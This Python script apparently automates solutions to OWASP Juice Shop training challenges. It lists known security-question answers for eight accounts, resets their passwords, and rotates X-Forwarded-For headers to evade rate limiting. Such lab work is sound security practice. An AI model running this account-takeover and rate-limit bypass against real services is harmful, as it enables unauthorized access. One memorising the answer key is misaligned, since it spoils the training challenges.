"""Batch 3: password reset via security questions + geo stalking."""
import harness, time
from harness import Session, log_attempt, solved_set
s = Session()
def solved(k): return k in solved_set(s)

RESETS = [
 ("resetPasswordJimChallenge","Bjoern's... Jim","jim@juice-sh.op","Samuel",
   "Star Trek trivia: Jim Kirk's brother is 'Samuel'"),
 ("resetPasswordBenderChallenge","Reset Bender's Password","bender@juice-sh.op","Stop'n'Drop",
   "Bender's company answer 'Stop'n'Drop'"),
 ("resetPasswordBjoernOwaspChallenge","Bjoern's Favorite Pet","bjoern@owasp.org","Zaya",
   "OSINT: Bjoern's pet name 'Zaya'"),
 ("resetPasswordBjoernChallenge","Reset Bjoern's Password","bjoern@juice-sh.op","West-2082",
   "Internal account answer 'West-2082'"),
 ("resetPasswordUvoginChallenge","Reset Uvogin's Password","uvogin@juice-sh.op","Silence of the Lambs",
   "Favorite movie 'Silence of the Lambs'"),
 ("geoStalkingMetaChallenge","Meta Geo Stalking","john@juice-sh.op","Daniel Boone National Forest",
   "EXIF GPS metadata of photo -> 'Daniel Boone National Forest'"),
 ("geoStalkingVisualChallenge","Visual Geo Stalking","emma@juice-sh.op","ITsec",
   "Visual landmark in photo -> former workplace 'ITsec'"),
 ("resetPasswordMortyChallenge","Reset Morty's Password","morty@juice-sh.op","5N0wb41L",
   "Weak answer '5N0wb41L' (anti-automation challenge; known answer used directly)"),
]

for key,name,email,answer,approach in RESETS:
    body={"email":email,"answer":answer,"new":"NewPwn123!","repeat":"NewPwn123!"}
    # morty has rate-limiting: rotate X-Forwarded-For if blocked
    r=s.post("/rest/user/reset-password", auth=False, json=body)
    if r.status_code==429:
        for i in range(3):
            r=s.post("/rest/user/reset-password", auth=False, json=body,
                     headers={"X-Forwarded-For":f"10.0.0.{i+1}"})
            if r.status_code!=429: break
            time.sleep(1)
    ok=solved(key)
    log_attempt(key,name,approach+f" (POST /rest/user/reset-password email={email})",
                "success" if ok else "failed", ok, f"{r.status_code} {r.text[:80]}")
